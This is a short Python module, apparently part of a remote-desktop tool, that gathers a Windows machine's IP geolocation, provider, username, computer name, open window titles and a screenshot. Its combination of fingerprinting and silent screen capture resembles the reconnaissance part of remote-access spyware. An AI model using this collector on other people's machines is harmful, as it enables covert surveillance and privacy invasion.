"""
Remote desktop
data receiver file
"""

from requests import get
from platform import platform
from win32api import GetUserName, GetComputerName
from pyautogui import getAllTitles, getActiveWindowTitle, screenshot


class DataRequester(object):
    def __init__(self):
        """
        > Json Request to serivce "https://ipdata.co"
        > Using private key
        """
        self.url = "https://api.ipdata.co?api-key="
        self.private_key = ""

    def JsonLog(self):
        """
        > Json request
        :return: string
        """
        log_json = get(self.url + self.private_key).json()
        ip = "Address: " + log_json['ip']
        provider = "Provider: " + log_json['asn']['name']
        domain = "Domain: " + log_json['asn']['domain']
        city = "City: " + log_json['city']
        country = "Country: " + log_json['country_name']
        region = "Region: " + log_json['region']
        continent = "Continent: " + log_json['continent_name']
        sys = "Platform: " + platform()

        return f'{ip}\n{provider}\n{domain}\n{city}\n{country}\n{region}\n{continent}\n{sys}'


def get_username():
    """
    :return: string
    """
    return f'Username: "{GetUserName()}"'


def get_desktop_name():
    """
    :return: string
    """
    return f'Desktop: "{GetComputerName()}"'


def get_active_window():
    """
    :return: string
    """
    return f'Active window: "{getActiveWindowTitle()}"'


def get_all_titles():
    """
    > Sorting received titles (clearing tabs)
    :return: string
    """
    titles = [title for title in getAllTitles() if title]
    return "\n".join(titles)


def get_screenshot(path, name):
    """
    Creating screenshot
    :param path:
    :param name:
    :return: file_path
    """

    file_path = f'{path}\\{name}.png'
    screenshot(file_path)
    return file_path
